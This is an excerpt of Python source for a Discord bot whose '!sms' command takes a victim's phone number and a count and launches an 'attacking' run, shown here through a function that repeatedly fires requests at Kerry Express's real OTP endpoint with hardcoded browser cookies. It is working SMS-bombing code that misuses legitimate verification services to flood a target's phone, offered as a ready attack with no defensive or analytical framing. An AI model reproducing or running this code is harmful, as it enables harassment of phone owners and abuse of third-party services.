...
@bot.event
async def on_ready():
	activity = discord.Game(name="!sms")
	await bot.change_presence(status=discord.Status.online, activity=activity)
	print('Login as ' + bot.user.name)
	
# spam sms
@bot.command("sms")
async def sms(ctx, no=None, jam:int=None):
	try:
		if (str(ctx.message.channel.id) == "1050063537915047966"):
			if (no == None or jam == None):
				response = discord.Embed(title="⚠️ เกิดข้อผิดพลาด",description="เนื่องจากคุณระบุข้อมูลไม่ครบถ้วน",color=0xe31010)
				await ctx.reply(embed=response)
			else:
				phone = no
				jam = jam
				response = discord.Embed(title="✅ ทำรายการสำเร็จ",description=f"attacking to {no}",color=0x45fc03)
				await ctx.reply(embed=response)
				SMS(phone, jam)
	except:
		response = discord.Embed(title="⚠️ เกิดข้อผิดพลาด",description="เนื่องจากคุณกรอกข้อมูลไม่ถูกต้อง",color=0xe31010)
		await ctx.reply(embed=response)
...
def api71(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",headers={"cookie": "__cfruid=996531097f8ac4be840c55aa926e6657d3be9a7d-1669536785; _ga=GA1.2.1256361313.1669536787; _gid=GA1.2.1105469492.1669536787; _gat=1; next-i18next=th; next-i18next=th; TS01dbb077=0166bb864de84de1be5739dfffca8f4de15f09b01a35e654059cc6eeccb2d2805c81612305d660b0c6e834430212ebc1c4e88ed15ef246330886ed0e566c1b5fbb2e62ccf757db77c1a70d6830bfe0d05070f7d4b1; _tt_enable_cookie=1; _ttp=739afb4a-8558-47ec-a5a4-f5d775b5a248; _fbp=fb.1.1669536790721.12833968; d-chat-ct=1; OptanonAlertBoxClosed=2022-11-27T08:13:12.085Z; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Nov+27+2022+15%3A13%3A12+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.25.0&isIABGlobal=false&hosts=&consentId=67a89f3e-4cd3-4e63-9216-aed98655a6d1&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}")
